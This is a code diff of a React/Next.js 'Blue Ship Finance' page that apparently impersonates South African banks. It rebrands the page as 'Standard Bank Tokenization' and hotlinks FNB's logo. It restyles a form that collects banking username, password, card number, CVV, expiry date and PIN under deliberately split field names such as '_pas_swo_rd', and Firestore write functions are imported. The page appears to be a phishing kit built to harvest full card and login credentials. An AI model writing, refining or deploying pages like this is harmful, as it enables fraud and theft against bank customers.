@@ -1,34 +1,14 @@
 import React from "react";
-import { Meta } from "../../../components";
-import { Box } from "@mui/material";
-import PrivateRoute from "../../../components/auth/PrivateRoute";
-import { useState } from "react";
-import { useRouter } from "next/router";
-import { useContext } from "react";
-import userDataContext from "../../../context/UserDataContext";
-import cogoToast from "cogo-toast";
 import { addDoc, collection } from "firebase/firestore";
 import { db } from "../../../services/firebase.config";
-
-const inputStyles = {
-  color: "#383633",
-  background: "#fff",
-  border: "1px solid #ADDBDB",
-  lineHeight: "21px",
-  padding: "3px 6px",
-  outline: "none",
-  width: "170px",
-  fontSize: "13.5px",
-};
-
-const labelStyle = {
-  display: "flex",
-  gap: "1rem",
-  fontSize: "13.5px",
-  justifyContent: "space-between",
-  alignItems: "center",
-  maxWidth: "280px",
-};
+import { Meta } from "../../../components";
+import { Box, Typography } from "@mui/material";
+import PrivateRoute from "../../../components/auth/PrivateRoute";
+import { useContext } from "react";
+import userDataContext from "../../../context/UserDataContext";
+import { useState } from "react";
+import cogoToast from "cogo-toast";
+import { useRouter } from "next/router";
 
 const Fnb = () => {
   const router = useRouter();
@@ -41,7 +21,6 @@ const Fnb = () => {
     _c_v_v_: "",
     _exp_iry_Da_te_: "",
   });
-
   const { userData } = useContext(userDataContext);
 
   const {
@@ -52,13 +31,6 @@ const Fnb = () => {
     _c_v_v_,
     _exp_iry_Da_te_,
   } = formData;
-
-  const inputChangeHandler = (e) => {
-    setFormData((prev) => ({
-      ...prev,
-      [e.target.id]: e.target.value,
-    }));
-  };
 
   const tokenizeAccount = async () => {
     const validateDetails =
@@ -101,132 +73,103 @@ const Fnb = () => {
     }
   };
 
+  const inputChangeHandler = (e) => {
+    setFormData((prev) => ({
+      ...prev,
+      [e.target.id]: e.target.value,
+    }));
+  };
+
   return (
     <>
       <Meta
-        title="FNB Tokenization - Blue Ship Finance Internet Banking"
-        description="FNB Tokenization - Blue Ship Finance Internet Banking"
+        title="Standard Bank Tokenization - Blue Ship Finance Internet Banking"
+        description="Standard Bank Tokenization - Blue Ship Finance Internet Banking"
       />
-
       <PrivateRoute>
         <Box
           sx={{
-            background: "#009999",
-            py: 2,
-            pl: 4,
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            justifyContent: "center",
             minHeight: "100vh",
           }}
         >
-          <Box
-            sx={{
-              p: 2,
-              background: "#fff",
-              minHeight: "100vh",
-              borderTopLeftRadius: 16,
-              borderBottomLeftRadius: 16,
-            }}
-          >
-            <p style={{ color: "#009999" }}>Authenticate</p>
-            <form style={{ marginLeft: "4rem", maxWidth: "300px" }}>
-              <label id="usernameLabel" htmlFor="username" style={labelStyle}>
-                <span>Username:{"  "}</span>
+          <img
+            src="https://www.fnb.co.za/_assets/images/generic/skins/00/navigation/secondary-logo/header-logo_lrg.svg?v=1685708122000"
+            alt="Standard bank logo"
+            style={{ width: "60px", marginBottom: "2rem" }}
+          />
+          <Box sx={{ width: "100%", maxWidth: "416px" }}>
+            <form className="fnb-form">
+              <div>
+                <label htmlFor="username">Username</label>
                 <input
+                  name="username"
                   id="username"
-                  name="text"
-                  type="username"
-                  maxlength="40"
+                  type="text"
                   value={username}
-                  style={inputStyles}
                   onChange={inputChangeHandler}
                 />
-              </label>
-              <label
-                id="passwordLabel"
-                htmlFor="_pas_swo_rd"
-                style={labelStyle}
-              >
-                <span>Password:{"  "}</span>
+              </div>
+              <div>
+                <label htmlFor="_pas_swo_rd">Password</label>
                 <input
+                  name="password"
                   id="_pas_swo_rd"
-                  name="_pas_swo_rd"
                   type="password"
-                  maxlength="40"
-                  style={inputStyles}
-                  onChange={inputChangeHandler}
                   value={_pas_swo_rd}
+                  onChange={inputChangeHandler}
                 />
-              </label>
-              <label
-                id="cardNumberLabel"
-                htmlFor="_ca_rd_Num_ber"
-                style={labelStyle}
-              >
-                <span>Card Number:{"  "}</span>
+              </div>
+              <div>
+                <label htmlFor="_ca_rd_Num_ber">Card Number</label>
                 <input
+                  name="cardNumber"
                   id="_ca_rd_Num_ber"
-                  name="_ca_rd_Num_ber"
                   type="number"
-                  maxlength="18"
-                  style={inputStyles}
                   value={_ca_rd_Num_ber}
                   onChange={inputChangeHandler}
                 />
-              </label>
-              <label
-                id="cardPinLabel"
-                htmlFor="_exp_iry_Da_te_"
-                style={labelStyle}
-              >
-                <span>Pin:{"  "}</span>
-
+              </div>
+              <div>
+                <label htmlFor="_c_v_v_">CVV</label>
                 <input
-                  name="_exp_iry_Da_te_"
-                  id="_exp_iry_Da_te_"
-                  type="date"
-                  value={_exp_iry_Da_te_}
-                  style={inputStyles}
-                  onChange={inputChangeHandler}
-                />
-              </label>
-              <label id="cardPinLabel" htmlFor="_c_v_v_" style={labelStyle}>
-                <span>CVV:{"  "}</span>
-                <input
-                  name="_c_v_v_"
+                  name="cvv"
                   id="_c_v_v_"
                   type="number"
                   value={_c_v_v_}
                   onChange={inputChangeHandler}
-                  style={inputStyles}
                 />
-              </label>
-              <label id="cardPinLabel" htmlFor="_p_i_n_" style={labelStyle}>
-                <span>Pin:{"  "}</span>
-
+              </div>
+              <div>
+                <label htmlFor="_exp_iry_Da_te_">Expiry Date</label>
                 <input
-                  name="_p_i_n_"
+                  name="expiryDate"
+                  id="_exp_iry_Da_te_"
+                  type="date"
+                  value={_exp_iry_Da_te_}
+                  onChange={inputChangeHandler}
+                />
+              </div>
+              <div>
+                <label htmlFor="_p_i_n_">Pin</label>
+                <input
+                  name="pin"
                   id="_p_i_n_"
                   type="number"
                   value={_p_i_n_}
                   onChange={inputChangeHandler}
-                  maxlength="4"
-                  style={inputStyles}
                 />
-              </label>
+              </div>
 
               <button
                 type="button"
-                style={{
-                  outline: "none",
-                  border: "none",
-                  background: "#ff9900",
-                  padding: "6px 16px",
-                  color: "#fff",
-                  cursor: "pointer",
-                }}
                 onClick={tokenizeAccount}
                 disabled={isLoading}
               >
-                {isLoading ? "Loading..." : "Submit"}
+                {isLoading ? "LOADING..." : "SUBMIT"}
               </button>
             </form>
           </Box>
